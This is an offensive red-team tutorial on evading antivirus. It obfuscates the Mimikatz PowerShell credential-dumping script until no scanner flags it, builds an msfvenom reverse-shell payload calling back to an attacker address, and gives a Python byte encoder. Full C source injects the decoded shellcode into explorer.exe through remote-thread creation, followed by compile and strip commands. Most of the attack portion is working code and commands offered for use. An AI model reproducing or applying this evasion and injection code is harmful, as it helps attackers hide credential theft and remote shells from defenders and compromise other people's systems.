## PowerShell Obfuscation

In this article, we will talk about how you can bypass Antivirus Solutions through PowerShell Obfuscation, we will apply this technique on Mimikatz, and Mimikatz has two versions, one is the EXE version, and the other is the powershell, so here we will work on the powershell version and you can find it at the following link.
```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
```

If you downloaded the previous powershell version and run it against any antivirus solution, it will mark it as a malicious file.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen1.png?raw=true)

Now we need to make the previous powershell file to be undetectable by most of the antivirus solutions and to do that we need to change its signature so no one of the antiviruses identifies it.

So now we need to change everything inside the powershell file that the antivirus can search for it like comments, strings, variables, and so on.
```
# Different shapes of strings in powershell (all the same meaning)
echo "Hello World"
echo ('H'+'ello '+'Wo'+'rld')
echo ("{0}{3}{2}{1}" -f'Hel','d','orl','lo W')

# Different shapes of variables in powershell (all the same meaning)
$param = 5
${p`AR`Am} = 5

# Different shapes of assigning members to object in powershell
$param.category = "Test"
$param.CaTEGoRY = "Test"
$param."CAT`Eg`Ory" = "Test"

# Different shapes of arguments in powershell (all the same meaning)
Add-Member -Name blabla
Add-Member -Name b`LAb`la
Add-Member -Name ('blabl'+'a')
Add-Member -Name ("{2}{1}{0}"-f'a','bl','bla')
```

All the previous examples are different ways to represent the same values inside the powershell code, and this is the mindset used in the obfuscation process.

Now we will use a tool to automate the previous changes.

Tool Link: https://github.com/danielbohannon/Invoke-Obfuscation
```
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen2.png?raw=true)

Enter the script you want to obfuscate inside the tool.
```
set ScriptPath c:/Users/Test/mimikatz.ps1
```

Choose the token option, this option lets us change a lot of things inside powershell code.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen3.png?raw=true)

You can now change anything inside the code based on the following options as we illustrated previously.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen4.png?raw=true)

Now we removed all the comments inside the code and save it.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen5.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen6.png?raw=true)

The antiviruses catch this file decreased from 32 to 30.

Now we will obfuscate all the strings inside the file.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen7.png?raw=true)

Obfuscate the strings another round.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen8.png?raw=true)

Antiviruses decreased to 25.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen9.png?raw=true)

Change the variables.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen10.png?raw=true)

Antiviruses decreased to 18.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen11.png?raw=true)

You need to verify that the file is working as intended after every change inside the file.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen12.png?raw=true)

The file is working fine, and the antivirus number became 18 from 32.

Now we will change the arguments, members, and commands.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen13.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen14.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen15.png?raw=true)

Now the powershell version of mimikatz is undetectable from all the antivirus solutions.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen16.png?raw=true)

Save the file and try to run it.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen17.png?raw=true)

Simple comparison between the powershell code before and after the obfuscation, this is what makes the file undetectable by the antivirus.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen18.png?raw=true)

Virus total comparison before and after the obfuscation.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen19.png?raw=true)

Summary of all the commands used.
```
# Load the Module
Import-Module ./Invoke-Obfuscation.psd1

# Run the Tool
Invoke-Obfuscation

# Set the Script Location
set ScriptPath C:\Users\Hassan\Mimikatz.ps1

# Start the Obfs
token

# Remove Comments
comment
1
back

# Change Strings
string
1
2
back

# Change Variables
variable
1
back

# Change Arguments
argument
3
back

# Change Members
member
3
back

# Change Commands
command
3
back

# Save the File
out C:\Users\Hassan\dump.ps1

# Exit the Program
exit
```

## Memory Injection

Now we will work on how we can make a Metasploit payload undetectable by most of the antiviruses.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw exitfunc=thread > test1.exe
```

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen20.png?raw=true)

A lot of antiviruses mark it as malicious.

Python code to change the metasploit payload by adding one to every byte and save the encoded result.

```
# Python Encoder Script
import sys

# Original Data in Bytes
original_data = bytearray(sys.stdin.read())

# New Data in Decimal
new_shellcode = []
for opcode in original_data:
	if opcode == 255:
		new_opcode = opcode
  else:
		new_opcode = opcode + 0x01

	new_shellcode.append(new_opcode)

# New Data in Hex
print "New Data in Hex:"
print "".join(["\\x{0}".format(hex(abs(i)).replace("0x", "")) for i in new_shellcode])

# New Data in Bytes
new_bytes = bytearray()
for i in new_shellcode:
	new_bytes.append(chr(i))

# Store Data in File
newFile = open('test2.exe','w')
newFile.write(new_bytes)
newFile.close()
```

Pass the metasploit payload through pipe to the python code to perform the encoding and save the result as test2.exe file.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw exitfunc=thread | python encoder.py 
```

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen21.png?raw=true)

Test this raw payload on virus total.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen22.png?raw=true)

No antivirus identifies it, but to make things clear here, until now we are working with a raw payload which is only the shellcode, not a full working executable file.

Now we will take this new undetectable shellcode and inject it inside a process in windows, and in this case, we will inject it inside explorer.exe process.

The first part of the code is the GetProcId function, its main purpose to give it the process name and it will communicate with the operating system to find the process id of this process.

```
DWORD ProcId = 0;

int GetProcId(char* ProcName)
{
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot = NULL;
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if ( Process32First( hSnapshot, &pe32 ) )
	{
		do{
			if( strcmp( pe32.szExeFile, ProcName ) == 0 )
				break;
		}while( Process32Next( hSnapshot, &pe32 ) );
	}

	if( hSnapshot != INVALID_HANDLE_VALUE )
		CloseHandle( hSnapshot );

	ProcId = pe32.th32ProcessID;
	return ProcId;
}
```

The second part is an iteration over the encoded shellcode to decode it by subtracting one from every byte.

```
int main(int argc, char **argv){

	int process_id;	
	char* ProcName;
	ProcName = "explorer.exe";
	process_id = GetProcId(ProcName);
	printf("Process ID is %d\n", process_id);

	unsigned char code[] = "\xfd\x49\x84\xe5\xf1\xe9\xc1\x1\x1\x1\x42\x52\x42\x51\x53\x52\x57\x49\x32\xd3\x66\x49\x8c\x53\x61\x49\x8c\x53\x19\x49\x8c\x53\x21\x49\x8c\x73\x51\x49\x10\xb8\x4b\x4b\x4e\x32\xca\x49\x32\xc1\xad\x3d\x62\x7d\x3\x2d\x21\x42\xc2\xca\xe\x42\x2\xc2\xe3\xee\x53\x42\x52\x49\x8c\x53\x21\x8c\x43\x3d\x49\x2\xd1\x8c\x81\x89\x1\x1\x1\x49\x86\xc1\x75\x68\x49\x2\xd1\x51\x8c\x49\x19\x45\x8c\x41\x21\x4a\x2\xd1\xe4\x57\x49\xff\xca\x42\x8c\x35\x89\x49\x2\xd7\x4e\x32\xca\x49\x32\xc1\xad\x42\xc2\xca\xe\x42\x2\xc2\x39\xe1\x76\xf2\x4d\x4\x4d\x25\x9\x46\x3a\xd2\x76\xd9\x59\x45\x8c\x41\x25\x4a\x2\xd1\x67\x42\x8c\xd\x49\x45\x8c\x41\x1d\x4a\x2\xd1\x42\x8c\x5\x89\x49\x2\xd1\x42\x59\x42\x59\x5f\x5a\x5b\x42\x59\x42\x5a\x42\x5b\x49\x84\xed\x21\x42\x53\xff\xe1\x59\x42\x5a\x5b\x49\x8c\x13\xea\x58\xff\xff\xff\x5e\x4a\xbf\x78\x74\x33\x60\x34\x33\x1\x1\x42\x57\x4a\x8a\xe7\x49\x82\xed\xa1\x2\x1\x1\x4a\x8a\xe6\x4a\xbd\x3\x1\x12\x5d\xc1\xa9\x2\x5\x42\x55\x4a\x8a\xe5\x4d\x8a\xf2\x42\xbb\x4d\x78\x27\x8\xff\xd6\x4d\x8a\xeb\x69\x2\x2\x1\x1\x5a\x42\xbb\x2a\x81\x6c\x1\xff\xd6\x51\x51\x4e\x32\xca\x4e\x32\xc1\x49\xff\xc1\x49\x8a\xc3\x49\xff\xc1\x49\x8a\xc2\x42\xbb\xeb\x10\xe0\xe1\xff\xd6\x49\x8a\xc8\x6b\x11\x42\x59\x4d\x8a\xe3\x49\x8a\xfa\x42\xbb\x9a\xa6\x75\x62\xff\xd6\x49\x82\xc5\x41\x3\x1\x1\x4a\xb9\x64\x6e\x65\x1\x1\x1\x1\x1\x42\x51\x42\x51\x49\x8a\xe3\x58\x58\x58\x4e\x32\xc1\x6b\xe\x5a\x42\x51\xe3\xfd\x67\xc8\x45\x25\x55\x2\x2\x49\x8e\x45\x25\x19\xc7\x1\x69\x49\x8a\xe7\x57\x51\x42\x51\x42\x51\x42\x51\x4a\xff\xc1\x42\x51\x4a\xff\xc9\x4e\x8a\xc2\x4d\x8a\xc2\x42\xbb\x7a\xcd\x40\x87\xff\xd6\x49\x32\xd3\x49\xff\xcb\x8c\xf\x42\xbb\x9\x88\x1e\x61\xff\xd6\xbc\xe1\x1e\x2b\xb\x42\xbb\xa7\x96\xbe\x9e\xff\xd6\x49\x84\xc5\x29\x3d\x7\x7d\xb\x81\xfc\xe1\x76\x6\xbc\x48\x14\x73\x70\x6b\x1\x5a\x42\x8a\xdb\xff\xd6";

	int i;
	for(i=0;i<sizeof(code)-1;i++){
		if (code[i] == 255){
			code[i] = code[i];
		}
		else{
			code[i] = code[i] - 0x01;
		}
	}
```

The third part is the OpenProcess function where we give it the process id and it assigns a reference to the location of this process which is in this case explorer.exe

```
HANDLE process_handle;
DWORD pointer_after_allocated;
process_handle =  OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);

if (process_handle==NULL){
  puts("[-]Error while open the process\n");
}else{
  puts("[+] Process Opened sucessfully\n");
}
```

The fourth part is the VirtualAllocEx where we give it the process reference and the size of shellcode to reserve in the memory of explorer.exe a space to hold the shellcode.

```
pointer_after_allocated = VirtualAllocEx(process_handle, NULL , sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if(pointer_after_allocated==NULL){
	puts("[-]Error while get the base address to write\n");
}else{
	printf("[+]Got the address to write 0x%x\n", pointer_after_allocated);
}
```

The last part is to write the actual shellcode inside the space we reserved and to create a separate thread to run our malicious shellcode.

```
if(WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, (LPCVOID)code, sizeof(code), 0)){
		puts("[+]Happened\n");
		puts("[+]Running the code as new thread !\n");
		CreateRemoteThread(process_handle, NULL, 100,(LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, 0); 
}else{
		puts("Not Happened\n");
}
```

The full code:

```
#include <windows.h>
#include <sys/types.h>
#include <unistd.h>
#include <tlhelp32.h>
DWORD ProcId = 0;

int GetProcId(char* ProcName)
{
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot = NULL;
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if ( Process32First( hSnapshot, &pe32 ) )
	{
		do{
			if( strcmp( pe32.szExeFile, ProcName ) == 0 )
				break;
		}while( Process32Next( hSnapshot, &pe32 ) );
	}

	if( hSnapshot != INVALID_HANDLE_VALUE )
		CloseHandle( hSnapshot );

	ProcId = pe32.th32ProcessID;
	return ProcId;
}


int main(int argc, char **argv){

	int process_id;	
	char* ProcName;
	ProcName = "explorer.exe";
	process_id = GetProcId(ProcName);
	printf("Process ID is %d\n", process_id);

	unsigned char code[] = "\xfd\x49\x84\xe5\xf1\xe9\xc1\x1\x1\x1\x42\x52\x42\x51\x53\x52\x57\x49\x32\xd3\x66\x49\x8c\x53\x61\x49\x8c\x53\x19\x49\x8c\x53\x21\x49\x8c\x73\x51\x49\x10\xb8\x4b\x4b\x4e\x32\xca\x49\x32\xc1\xad\x3d\x62\x7d\x3\x2d\x21\x42\xc2\xca\xe\x42\x2\xc2\xe3\xee\x53\x42\x52\x49\x8c\x53\x21\x8c\x43\x3d\x49\x2\xd1\x8c\x81\x89\x1\x1\x1\x49\x86\xc1\x75\x68\x49\x2\xd1\x51\x8c\x49\x19\x45\x8c\x41\x21\x4a\x2\xd1\xe4\x57\x49\xff\xca\x42\x8c\x35\x89\x49\x2\xd7\x4e\x32\xca\x49\x32\xc1\xad\x42\xc2\xca\xe\x42\x2\xc2\x39\xe1\x76\xf2\x4d\x4\x4d\x25\x9\x46\x3a\xd2\x76\xd9\x59\x45\x8c\x41\x25\x4a\x2\xd1\x67\x42\x8c\xd\x49\x45\x8c\x41\x1d\x4a\x2\xd1\x42\x8c\x5\x89\x49\x2\xd1\x42\x59\x42\x59\x5f\x5a\x5b\x42\x59\x42\x5a\x42\x5b\x49\x84\xed\x21\x42\x53\xff\xe1\x59\x42\x5a\x5b\x49\x8c\x13\xea\x58\xff\xff\xff\x5e\x4a\xbf\x78\x74\x33\x60\x34\x33\x1\x1\x42\x57\x4a\x8a\xe7\x49\x82\xed\xa1\x2\x1\x1\x4a\x8a\xe6\x4a\xbd\x3\x1\x12\x5d\xc1\xa9\x2\x5\x42\x55\x4a\x8a\xe5\x4d\x8a\xf2\x42\xbb\x4d\x78\x27\x8\xff\xd6\x4d\x8a\xeb\x69\x2\x2\x1\x1\x5a\x42\xbb\x2a\x81\x6c\x1\xff\xd6\x51\x51\x4e\x32\xca\x4e\x32\xc1\x49\xff\xc1\x49\x8a\xc3\x49\xff\xc1\x49\x8a\xc2\x42\xbb\xeb\x10\xe0\xe1\xff\xd6\x49\x8a\xc8\x6b\x11\x42\x59\x4d\x8a\xe3\x49\x8a\xfa\x42\xbb\x9a\xa6\x75\x62\xff\xd6\x49\x82\xc5\x41\x3\x1\x1\x4a\xb9\x64\x6e\x65\x1\x1\x1\x1\x1\x42\x51\x42\x51\x49\x8a\xe3\x58\x58\x58\x4e\x32\xc1\x6b\xe\x5a\x42\x51\xe3\xfd\x67\xc8\x45\x25\x55\x2\x2\x49\x8e\x45\x25\x19\xc7\x1\x69\x49\x8a\xe7\x57\x51\x42\x51\x42\x51\x42\x51\x4a\xff\xc1\x42\x51\x4a\xff\xc9\x4e\x8a\xc2\x4d\x8a\xc2\x42\xbb\x7a\xcd\x40\x87\xff\xd6\x49\x32\xd3\x49\xff\xcb\x8c\xf\x42\xbb\x9\x88\x1e\x61\xff\xd6\xbc\xe1\x1e\x2b\xb\x42\xbb\xa7\x96\xbe\x9e\xff\xd6\x49\x84\xc5\x29\x3d\x7\x7d\xb\x81\xfc\xe1\x76\x6\xbc\x48\x14\x73\x70\x6b\x1\x5a\x42\x8a\xdb\xff\xd6";

	int i;
	for(i=0;i<sizeof(code)-1;i++){
		if (code[i] == 255){
			code[i] = code[i];
		}
		else{
			code[i] = code[i] - 0x01;
		}
	}

	HANDLE process_handle;
	DWORD pointer_after_allocated;
	process_handle =  OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);

	if (process_handle==NULL){
		puts("[-]Error while open the process\n");
	}else{
		puts("[+] Process Opened sucessfully\n");
	}

	pointer_after_allocated = VirtualAllocEx(process_handle, NULL , sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if(pointer_after_allocated==NULL){
		puts("[-]Error while get the base address to write\n");
	}else{
		printf("[+]Got the address to write 0x%x\n", pointer_after_allocated);
	}

	if(WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, (LPCVOID)code, sizeof(code), 0)){
		puts("[+]Happened\n");
		puts("[+]Running the code as new thread !\n");
		CreateRemoteThread(process_handle, NULL, 100,(LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, 0); 
	}else{
		puts("Not Happened\n");
	}

}
```

Compile the code:
```
# Compile code to exe
apt-get install mingw-w64
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

Strip all the debugging data from the compiled file.
```
strip --strip-all main64.exe
```

Lastly, run the file to validate that it's working properly.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen23.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen24.png?raw=true)

The result is almost good where this file not detected by most of the antivirus solutions and just detected by 5 from more than 70 antiviruses.
